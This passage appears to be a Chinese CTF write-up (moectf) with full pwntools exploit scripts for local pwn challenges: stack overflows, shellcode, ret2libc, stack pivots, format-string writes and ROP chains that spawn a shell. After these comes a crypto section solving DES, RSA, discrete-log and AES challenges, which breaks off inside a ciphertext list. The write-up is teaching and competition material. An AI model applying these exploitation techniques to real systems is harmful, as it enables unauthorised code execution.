p = remote(&#x27;127.0.0.1&#x27;,52128)

p.recvuntil(b"Here is the hint.")
num_bytes = p.recv(8)
num_value = u64(num_bytes)
p.recvuntil(b">")
p.sendline(str(num_value).encode())
p.interactive()

### EZtext
简单栈溢出覆盖返回地址
python15 linescopyfrom pwn import *
p = remote(&#x27;127.0.0.1&#x27;,51054)

treasure_addr = 0x4011B6
ret_addr = 0x4011DE # gadget
p.recvuntil(b"how many bytes do you need to overflow the stack?\\n")
p.sendline(b"32")  # 16 + 8(ret) + 8(treasure) = 32

payload = b&#x27;A&#x27; * 16
payload += p64(ret_addr)    # 用于栈对齐的 ret 指令
payload += p64(treasure_addr)  # 目标函数

p.send(payload)
p.interactive()

### ezshellcode
先把内存设置为可读可写可执行，然后发shellcode即可
python19 linescopyfrom pwn import *

context.arch = &#x27;amd64&#x27;
context.log_level = &#x27;debug&#x27;

io = remote("127.0.0.1", 1234)
#io = process("./pwn")

io.recvuntil(b"I will give you some choices. Choose wisely!")
log.info("Sending choice &#x27;4&#x27; to set memory as RWX")
io.sendline(b"4")
io.recvuntil(b"think about the permissions you just set.")
shellcode = asm(shellcraft.sh())
log.info("Generated shellcode:")
print(hexdump(shellcode))
io.sendline(shellcode)

io.interactive()
### find it
问答题
text7 linescopyI've hidden the fd of stdout. Can you find it?
3
You are right.What would you like to see?
/flag
What is its fd?
1
moectf{******}
### 认识libc
ezlibc青春版，已经执行过printf，无需二次返回main
python35 linescopyfrom pwn import *

context(os="linux", arch="amd64", log_level="debug")

# io = process("./pwn")
io = remote("127.0.0.1", 1234)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

io.recvuntil(b"A gift of forbidden knowledge, the location of &#x27;printf&#x27;: ")
leaked_printf_str = io.recvline().strip()
leaked_printf_addr = int(leaked_printf_str, 16)
log.success(f"printf address: {hex(leaked_printf_addr)}")

libc.address = leaked_printf_addr - libc.symbols[&#x27;printf&#x27;]
log.success(f"libc base address: {hex(libc.address)}")

pop_rdi_ret = next(libc.search(asm(&#x27;pop rdi; ret&#x27;)))
bin_sh_addr = next(libc.search(b&#x27;/bin/sh\\x00&#x27;))
system_addr = libc.symbols[&#x27;system&#x27;]
ret_gadget = pop_rdi_ret + 1 

offset_to_rbp = 64
payload = b&#x27;A&#x27; * offset_to_rbp
payload += p64(0xdeadbeefcafebabe)
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
### ezpivot
栈迁移
python45 linescopyfrom pwn import *

context.log_level = &#x27;info&#x27;
context.arch = &#x27;amd64&#x27;
elf = ELF(&#x27;./pwn&#x27;)
#p = process(&#x27;./pwn&#x27;)
p = remote(&#x27;127.0.0.1&#x27;, 1234)

rop = ROP(elf)
leave_ret_gadget = 0x40120f
pop_rdi_ret_gadget = rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;]).address
ret_gadget = rop.find_gadget([&#x27;ret&#x27;]).address
system_addr = elf.plt[&#x27;system&#x27;]
desc_addr = elf.symbols[&#x27;desc&#x27;]

# 这里我们预留0x800的空间给新栈，太小会导致system函数无法运行
buffer_headroom = 0x800
rop_chain_addr = desc_addr + buffer_headroom

rop_chain = p64(pop_rdi_ret_gadget)
rop_chain += p64(desc_addr)             # RDI -> 指向缓冲区的开头，即 "/bin/sh"
rop_chain += p64(ret_gadget)            # 栈对齐
rop_chain += p64(system_addr)           # 跳转到 system 函数

# [/bin/sh\\x00] + [padding] + [Fake RBP for leave] + [ROP Chain]
payload1 = b&#x27;/bin/sh\\x00&#x27;
padding_size = buffer_headroom - len(payload1)
payload1 += b&#x27;\\x00&#x27; * padding_size
payload1 += p64(0xdeadbeefdeadbeef)     # Fake RBP
payload1 += rop_chain

final_payload_to_send = b&#x27;-1 &#x27; + payload1
p.recvuntil(b&#x27;the length of your introduction.\\n&#x27;)
p.send(final_payload_to_send)
p.recvuntil(b&#x27;Ok,we got your introduction!\\n&#x27;)

offset_to_rbp = 12
payload2_pivot = b&#x27;A&#x27; * offset_to_rbp
payload2_pivot += p64(rop_chain_addr)
payload2_pivot += p64(leave_ret_gadget)

p.recvuntil(b&#x27;Now, please tell us your phone number:\\n&#x27;)
p.send(payload2_pivot)

p.interactive()
### fmt
格式化字符串漏洞，这里懒得本地调试确定偏移了，直接远程暴力尝试
python93 linescopyfrom pwn import *

HOST = &#x27;127.0.0.1&#x27;
PORT = 52618

def is_letter(byte_val):
    return (b&#x27;a&#x27;[0] <= byte_val <= b&#x27;z&#x27;[0]) or (b&#x27;A&#x27;[0] <= byte_val <= b&#x27;Z&#x27;[0])

def find_offsets_remote():
    p = remote(HOST, PORT)

    try:
        start_offset = 7
        end_offset = 25
        probe_payload = b"|".join([f"%{i}$p".encode() for i in range(start_offset, end_offset)])
        
        p.recvuntil(b"what&#x27;s your name?\\n")
        log.info(f"发送单次探测载荷: {probe_payload}")
        p.sendline(probe_payload)
        
        p.recvuntil(b&#x27;Nice to meet you,&#x27;)
        leaked_data = p.recvline().strip()
        leaked_parts = leaked_data.split(b&#x27;|&#x27;)
        
        offset_s2_val = None
        offset_v4_ptr = None

        for index, part in enumerate(leaked_parts):
            current_offset = start_offset + index
            if part.startswith(b&#x27;0x5&#x27;) and not offset_v4_ptr:
                offset_v4_ptr = current_offset
                log.success(f"找到 v4 指针的偏移: {current_offset} -> {part.decode()}")
            try:
                if b&#x27;nil&#x27; in part:
                    continue
                leaked_val = int(part, 16)
                leaked_bytes = p64(leaked_val)
                if all(is_letter(b) for b in leaked_bytes[:5]) and leaked_bytes[5] == 0:
                    if not offset_s2_val:
                        offset_s2_val = current_offset
                        log.success(f"找到 s2 内容的偏移: {current_offset} -> {leaked_bytes[:5].decode()}")
            except (ValueError, IndexError):
                continue
        p.close()

        if not offset_s2_val or not offset_v4_ptr:
            return None, None
        return offset_s2_val, offset_v4_ptr

    except EOFError:
        p.close()
        return None, None

def exploit(offset_s2, offset_v4):
    log.info(f"s2_offset={offset_s2}, v4_offset={offset_v4}")
    p = remote(HOST, PORT)

    try:
        payload = f&#x27;%{offset_s2}$p.%{offset_v4}$s&#x27;.encode()

        log.info(f"payload: {payload}")
        p.recvuntil(b"what&#x27;s your name?\\n")
        p.sendline(payload)

        p.recvuntil(b&#x27;Nice to meet you,&#x27;)
        leaked_data = p.recvline().strip()
        log.info(f"leak: {leaked_data}")
        leaked_s2_hex, leaked_v4_str = leaked_data.split(b&#x27;.&#x27;)
        s2_value = int(leaked_s2_hex, 16)
        treasure1 = p64(s2_value)[:5]
        log.success(f"s2: {treasure1}")
        treasure2 = leaked_v4_str[:5]
        log.success(f"v4 content: {treasure2}")
        p.recvuntil(b"Can you find them?\\n")
        p.sendline(treasure1)

        p.recvuntil(b"Yeah,another one?\\n")
        p.sendline(treasure2)

        p.recvuntil(b"You got it!\\n")
        p.interactive()

    except EOFError:
        p.close()

if __name__ == "__main__":
    s2_offset, v4_offset = find_offsets_remote()

    if s2_offset and v4_offset:
        exploit(s2_offset, v4_offset)

### randomlock
分析二进制可知seed恒为1，c++生成一串即可
python28 linescopyfrom pwn import *

HOST = &#x27;127.0.0.1&#x27; 
PORT = 54065

correct_passwords = [
    9383,
    886,
    2777,
    6915,
    7793,
    8335,
    5386,
    492,
    6649,
    1421
]

def main():
    p = remote(HOST, PORT)
    for i, password in enumerate(correct_passwords):
        p.recvuntil(b&#x27;>&#x27;)
        log.info(f"发送密码 {i+1}: {password}")
        p.sendline(str(password).encode())
    p.interactive()

if __name__ == "__main__":
    main()
### str_check
栈溢出覆盖返回地址
python17 linescopyfrom pwn import *

p = remote(&#x27;127.0.0.1&#x27;, 57640)

backdoor_addr = 0x401236
ret_gadget=0x40124F

padding = b&#x27;meow\\x00&#x27; + b&#x27;A&#x27; * 35
payload = padding + p64(ret_gadget) + p64(backdoor_addr)
n_copy = len(payload)
p.recvuntil(b"What can u say?\\n")
p.sendline(payload)
p.recvuntil(b"So,what size is it?\\n")
p.sendline(str(n_copy).encode())

p.interactive()

### syslock
lose函数中存在syscall，构造rop调用该syscall即可
python58 linescopyfrom pwn import *

HOST = &#x27;127.0.0.1&#x27;
PORT = 58708
exe = ELF("./pwn")
context.binary = exe
rop = ROP(exe)
try:
    pop_rdi_rsi_rdx_ret = rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;pop rsi&#x27;, &#x27;pop rdx&#x27;, &#x27;ret&#x27;])[0]
    pop_rax_ret = rop.find_gadget([&#x27;pop rax&#x27;, &#x27;ret&#x27;])[0]
    syscall_addr = rop.find_gadget([&#x27;syscall&#x27;])[0]
except IndexError as e:
    exit(1)

bss_addr = exe.bss() + 0x200 # 在.bss段找一块可写的空地
read_plt = exe.plt[&#x27;read&#x27;]

# 构建ROP链
chain = b&#x27;&#x27;
# --- 调用 read(0, bss_addr, 8) ---
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(0)          # rdi = 0 (stdin)
chain += p64(bss_addr)   # rsi = bss_addr
chain += p64(8)          # rdx = 8 (bytes to read)
chain += p64(read_plt)   # 调用 read 函数

# --- 调用 execve(bss_addr, 0, 0) ---
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(bss_addr)   # rdi = pointer to "/bin/sh"
chain += p64(0)          # rsi = 0
chain += p64(0)          # rdx = 0
chain += p64(pop_rax_ret)
chain += p64(59)         # rax = 0x3b (SYS_execve)
chain += p64(syscall_addr) # 触发系统调用

def main():
    p = remote(HOST, PORT)
    p.recvuntil(b"choose mode\\n")
    p.sendline(b&#x27;-32&#x27;)
    p.recvuntil(b"Input your password\\n")
    p.send(p32(59)) # &#x27;59&#x27; 覆盖 i
    p.recvuntil(b"Developer Mode.\\n")

    # 72: 64(buf) + 8(saved rbp)
    offset_to_ret = 72
    payload = b&#x27;A&#x27; * offset_to_ret
    payload += chain
    p.send(payload)
    sleep(0.1)
    p.send(b&#x27;/bin/sh\\x00&#x27;)
    p.interactive()

if __name__ == "__main__":
    main()

### xdulaker
调用photo时溢出覆盖栈上内容使得laker函数校验通过，构造ROP进入backdoor即可
python39 linescopyfrom pwn import *

context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)
#p = process("./pwn")
p = remote("127.0.0.1", 1234)
elf = ELF("./pwn")

p.sendlineafter(b">", b"1")
p.recvuntil(b"Thanks,I&#x27;ll give you a gift:")
opt_addr = int(p.recvline().strip(), 16)
pie_base = opt_addr - elf.symbols[&#x27;opt&#x27;]
log.success(f"PIE Base: {hex(pie_base)}")

payload_for_photo = b&#x27;A&#x27; * 32 + b&#x27;xdulaker&#x27;
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Hey,what&#x27;s your name?!\\n", payload_for_photo)

p.sendlineafter(b">", b"3")

p.recvuntil(b"welcome,xdulaker\\n")
rop = ROP(elf)

backdoor_addr = pie_base + elf.symbols[&#x27;backdoor&#x27;]
ret_gadget_addr = rop.find_gadget([&#x27;ret&#x27;])[0]
writable_bss_addr = elf.bss()+0x800
log.success(f"backdoor address: {hex(backdoor_addr)}")

payload_for_laker = flat(
    b&#x27;A&#x27; * (48-8),              # 填充 s1 缓冲区
    writable_bss_addr,      # [rbp] 覆盖旧 rbp 为一个可写地址，以满足 leave 指令
    ret_gadget_addr,        # [rip] 首先跳转到 ret gadget 来对齐栈
    backdoor_addr + 8           # [new_stack] 然后再跳转到 backdoor 函数
)

p.sendline(payload_for_laker)

p.interactive()
### eazylibc
先patchelf使本地二进制使用题目给的libc
关键在于获取libc基址
然而有延迟绑定机制的存在，第一次打印的时候read还没有被调用，打印出来的并不是libc中的read，而是plt表中的read
但借此我们可以获取PIE基址
通过PIE基址+偏移我们可以返回到main函数运行第二次
此时由于read已经被调用过所以打印出的是真实地址
减去偏移即可得到libc基址
然后在libc中可以搜索gadget，构造system调用即可
python45 linescopyfrom pwn import *
context(os="linux", arch="amd64", log_level="debug")
io = process("./pwn")
io = remote("127.0.0.1", 1234)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

io.recvuntil(b"What is this?\\nHow can I use ")
leaked_read_str1 = io.recvuntil(b" without a backdoor? Damn!\\n", drop=True)
leaked_read_plt = int(leaked_read_str1, 16)
log.success(f"Address: {hex(leaked_read_plt)}")
pie_base = leaked_read_plt - 0x1060
log.success(f"PIE Base Address: {hex(pie_base)}")

elf.address = pie_base
new_stack_rbp = elf.bss() + 0x200
payload1 = b&#x27;A&#x27; * 32
payload1 += p64(new_stack_rbp) # leave; ret会进行栈迁移
payload1 += p64(pie_base + 0x11ee) 
io.send(payload1)

io.recvuntil(b"What is this?\\nHow can I use ")
leaked_read_str2 = io.recvuntil(b" without a backdoor? Damn!\\n", drop=True)
leaked_read = int(leaked_read_str2, 16)
log.success(f"Address: {hex(leaked_read)}")
libc_base = leaked_read - libc.sym[&#x27;read&#x27;]
log.success(f"libc Base Address: {hex(libc_base)}")
libc.address = libc_base

pop_rdi_ret = next(libc.search(asm(&#x27;pop rdi; ret&#x27;)))
bin_sh_addr = next(libc.search(b&#x27;/bin/sh\\x00&#x27;))
system_addr = libc.sym[&#x27;system&#x27;]

payload3 = b&#x27;B&#x27; * 32
payload3 += p64(new_stack_rbp) 
payload3 += p64(pop_rdi_ret + 1)       # ret
payload3 += p64(pop_rdi_ret)       # pop rdi; ret
payload3 += p64(bin_sh_addr)       # -> rdi = address of "/bin/sh"
payload3 += p64(system_addr)       # ret to system()
io.send(payload3)

io.interactive()
### fmt_S
每次talk会将flag^1，在bss上查看flag紧邻atk，只要在读取atk时输入长度为8，my_read就可以覆盖flag为0，这样保证我们有3次输入机会
在talk的printf函数调用处下断点发现栈上有链（链上地址都在栈中，这样就可以只修改低位字节），那么可以利用链实行任意地址写
在talk函数的retn处下断点发现rdi为atk，那么可以将atk设置为/bin/sh（加上\\x00正好8个字节），然后将栈上talk函数的返回地址利用链写成he函数中system的地方即可
python35 linescopyfrom pwn import *

context(os="linux", arch="amd64", log_level="info")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
#io = process("./pwn")
io = remote("127.0.0.1", 1234)

def interact(payload_str):
    fmt = payload_str.ljust(32, b&#x27;\\x00&#x27;)
    payload = fmt 
    io.sendafter(b"him...\\n", payload)

SYSTEM_CALL_ADDR = 0x40127B
LEAK_RBP_PARAM = 8

interact(f"%{LEAK_RBP_PARAM}$p".encode())
io.recvuntil(b&#x27;0x&#x27;)
leaked_talk_rbp = int(io.recvuntil(b"?", drop=True), 16)-0x20
info(f"Leaked RBP: {hex(leaked_talk_rbp)}")

return_addr_location = leaked_talk_rbp + 0x8 
io.sendafter(b"battle!\\n", b&#x27;/bin/sh\\x00&#x27;)

fmt2_str = "%{}c%{}$hn".format(return_addr_location % 0x10000, 8+0x48//8).encode()
interact(fmt2_str)
io.sendafter(b"battle!\\n", b&#x27;/bin/sh\\x00&#x27;)

fmt3_str = "%{}c%{}$hn".format(SYSTEM_CALL_ADDR % 0x10000, 47).encode()
interact(fmt3_str)
io.sendafter(b"battle!\\n", b&#x27;/bin/sh\\x00&#x27;)

io.interactive()
## crypto
### ez_DES
key有三字节未知，爆破即可
python21 linescopyfrom Crypto.Cipher import DES
import string
import itertools

c = b&#x27;\\xe6\\x8b0\\xc8m\\t?\\x1d\\xf6\\x99sA>\\xce \\rN\\x83z\\xa0\\xdc{\\xbc\\xb8X\\xb2\\xe2q\\xa4"\\xfc\\x07&#x27;

key_prefix = &#x27;ezdes&#x27;
characters = string.ascii_letters + string.digits + string.punctuation

for suffix_chars in itertools.product(characters, repeat=3):
    try:
        suffix = &#x27;&#x27;.join(suffix_chars)
        potential_key = (key_prefix + suffix).encode(&#x27;utf-8&#x27;)
        cipher = DES.new(potential_key, DES.MODE_ECB)
        decrypted_text = cipher.decrypt(c)
        if decrypted_text.startswith(b&#x27;moectf{&#x27;):
            flag = decrypted_text.split(b&#x27;}&#x27;)[0].decode(&#x27;utf-8&#x27;) + &#x27;}&#x27;
            print(f"Flag: {flag}")
            break
    except Exception as e:
        continue
### baby_next
由于q是p的后114514个素数，因此p，q应该都很接近平方根，尝试平方根附近的素数即可
python34 linescopyfrom Crypto.Util.number import long_to_bytes
import gmpy2
import math

n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397
c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967
e = 65537
ITERATIONS = 114514

s = gmpy2.isqrt(n)
avg_gap = math.log(s)
delta_approx = ITERATIONS * avg_gap
# p ≈ sqrt(n) - delta / 2
p_approx = s - int(delta_approx / 2)
p_candidate = gmpy2.prev_prime(p_approx)
while True:
    if n % p_candidate == 0:
        p = p_candidate
        q = n // p
        print(f"p = {p}")
        print(f"q = {q}")
        break
    p_candidate = gmpy2.prev_prime(p_candidate)

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)

flag = long_to_bytes(m)

print(f"Flag: {flag.decode(&#x27;utf-8&#x27;)}")

### ezBSGS
Baby-Step Giant-Step
python34 linescopyimport math

def solve_bsgs(base, result, modulus):
    m = math.isqrt(modulus) + 1
    baby_steps = {}
    baby_val = 1
    for j in range(m):
        if baby_val not in baby_steps:
            baby_steps[baby_val] = j
        baby_val = (baby_val * base) % modulus
    a_m = pow(base, m, modulus)
    inv_a_m = pow(a_m, modulus - 2, modulus)
    giant_val = result
    for i in range(m):
        if giant_val in baby_steps:
            j = baby_steps[giant_val]
            return i * m + j
        giant_val = (giant_val * inv_a_m) % modulus
    return None

if __name__ == "__main__":
    a = 13
    b = 114514
    p = 100000000000099

    print(f"{a}^x = {b} mod {p}")
    x = solve_bsgs(a, b, p)

    if x is not None:
        print(f"x : {x}")
    else:
        print("none")

### ez_square
完全平方公式，然后得到p-q，p+q，然后解出p，q
python27 linescopyfrom Crypto.Util.number import long_to_bytes
import gmpy2

n = 83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149
c = 69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190
hint = 5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304
e = 65537

D = gmpy2.isqrt(hint) # D = p - q
S_squared = 4 * n + D * D
S = gmpy2.isqrt(S_squared) # S = p + q

p = (S + D) // 2
q = (S - D) // 2

assert p * q == n
print(f"p = {p}")
print(f"q = {q}")

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(f"Flag: {flag.decode(&#x27;utf-8&#x27;)}")

### ezAES
python104 linescopyrc = [0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef,0xf1]

s_box = [
	[0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76],
	[0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0],
	[0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15],
	[0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75],
	[0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84],
	[0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf],
	[0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8],
	[0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2],
	[0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73],
	[0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb],
	[0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79],
	[0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08],
	[0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a],
	[0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e],
	[0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf],
	[0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]
]

s_box_inv = [
	[0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb],
	[0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb],
	[0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e],
	[0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25],
	[0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92],
	[0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84],
	[0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06],
	[0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b],
	[0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73],
	[0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e],
	[0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b],
	[0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4],
	[0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f],
	[0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef],
	[0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61],
	[0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]
]

def key_expansion(grid):
    for i in range(10 * 4):
        r = grid[-4:]
        if i % 4 == 0:
            for j, v in enumerate(r[1:] + r[:1]):
                r[j] = s_box[v >> 4][v & 0xf] ^ (rc[i // 4] if j == 0 else 0)
        for j in range(4):
            grid.append(grid[-16] ^ r[j])
    return grid

def add_round_key(grid, round_key):
    for i in range(16):
        grid[i] ^= round_key[i]

def inv_sub_bytes(grid):
    for i, v in enumerate(grid):
        grid[i] = s_box_inv[v >> 4][v & 0xf]
        
def inv_mix_columns(grid):
    def mul(a, b):
        p = 0
        for _ in range(8):
            if b & 1: p ^= a
            hi_bit = a & 0x80
            a = (a << 1) & 0xff
            if hi_bit: a ^= 0x1b
            b >>= 1
        return p

    def inv_mix_column(c):
        return [
            mul(c[0], 0x0e) ^ mul(c[1], 0x0b) ^ mul(c[2], 0x0d) ^ mul(c[3], 0x09),
            mul(c[0], 0x09) ^ mul(c[1], 0x0e) ^ mul(c[2], 0x0b) ^ mul(c[3], 0x0d),
            mul(c[0], 0x0d) ^ mul(c[1], 0x09) ^ mul(c[2], 0x0e) ^ mul(c[3], 0x0b),
            mul(c[0], 0x0b) ^ mul(c[1], 0x0d) ^ mul(c[2], 0x09) ^ mul(c[3], 0x0e),
        ]

    for i in range(0, 16, 4):
        grid[i:i + 4] = inv_mix_column(grid[i:i + 4])

def decrypt(block, expanded_key):
    add_round_key(block, expanded_key[-16:])
    inv_sub_bytes(block)
    for i in range(9, 0, -1):
        add_round_key(block, expanded_key[i * 16 : (i+1) * 16])
        inv_mix_columns(block)
        inv_sub_bytes(block)
    add_round_key(block, expanded_key[:16])
    return block

def aes_decrypt(key, ciphertext):
    expanded = key_expansion(bytearray(key))
    b = bytearray(ciphertext)
    for i in range(0, len(b), 16):
        b[i:i + 16] = decrypt(b[i:i + 16], expanded)
    return bytes(b)

if __name__ == &#x27;__main__&#x27;:
    key = b&#x27;Slightly different from the AES.&#x27;
    enc = b&#x27;%\\x98\\x10\\x8b\\x93O\\xc7\\xf02F\\xae\\xedA\\x96\\x1b\\xf9\\x9d\\x96\\xcb\\x8bT\\r\\xd31P\\xe6\\x1a\\xa1j\\x0c\\xe6\\xc8&#x27;

    decrypted_flag = aes_decrypt(key, enc)
    print(decrypted_flag)

### ezlegendre
python137 linescopyfrom Crypto.Util.number import long_to_bytes

p = 258669765135238783146000574794031096183
a = 144901483389896508632771215712413815934
ciphertext = [
    102230607782303286066661803375943337852, 196795077203291879584123548614536291210, 41820965969318717978206410470942308653,
    207485265608553973031638961376379316991, 126241934830164184030184483965965358511, 20250852993510047910828861636740192486,
    103669039044817273633962139070912140023, 97337342479349334554052986501856387313, 159127719377115088432849153087501377529,
    45764236700940832554086668329121194445, 35275004033464216369574866255836768148, 52905563179465420745275423120979831405,
    17032180473319795641143474346227445013, 29477780450507011415073117531375947096, 55487351149573346854028771906741727601,
    121576510894250531063152466107000055279, 69959515052241122548546701060784004682, 173839335744520746760315021378911211216,
    28266103662329817802592951699263023295, 194965730205655016437216590690038884309, 208284966254343254016582889051763066574,
    137680272193449000169293006333866420934, 250634504150859449051246497912830488025, 124228075953362483108097926850143387433,
    232956176229023369857830577971626577196, 149441784891021006224395235471825205661, 118758326165875568431376314508740278934,
    222296215466271835013184903421917936512, 49132466023594939909761224481560782731, 406286678537520849308828749751513339,
    215122152883292859254246948661946520324, 81283590250399459209567683991648438199, 150395133067480380674905743031927410663,
    5710878479977467762548400320726575491, 83627753774286426170934105100463456109, 164968224377869331545649899270867630850,
    241057183685774160581265732812497247167, 109136287048010096863680430193408099828, 116313129605409961931811582899075031153,
    202739016625709380026000805340243458300, 25408225921774957745573142542576755590, 151336258796933656160956289529558246702,
    2947189044370494063643525166023973095, 228678413963736672394976193093568181979, 40627063032321835707220414670018641024,
    55446789315226949622969082042881319148, 32219108726651509070669836923591948459, 134454924722414419191920784435633637634,
    97952023967728640730045857104376826039, 20659076942504417479953787092276592682, 93281761173713729777326842152860901050,
    133634773495582264000160065317239987936, 79976720152435218818731114555425458470, 234654694673289327542859971371886984118,
    51332273108989067644245919615090753756, 134120280423303717489979349737802826605, 182001158305920226320085758522717203725,
    98408798757865562737462169470346158516, 78200435603900368619334272308272773797, 232796357836930341547987600782979821555,
    589106968861493082018132081244848952, 24186003230092331554886767628744415123, 236070626491251466741246103662922841423,
    238699080882667864827094121849090696547, 141659873734297659078160283051728812410, 228977113517120063860252637394240795552,
    236613527842969921794004708284265628300, 145522034982744654991661857596541755396, 249608374387044047328725156440984678776,
    325110572051913836681821746093704556, 171492052199838424502681030556098576483, 156498865212994371079795360268866413702,
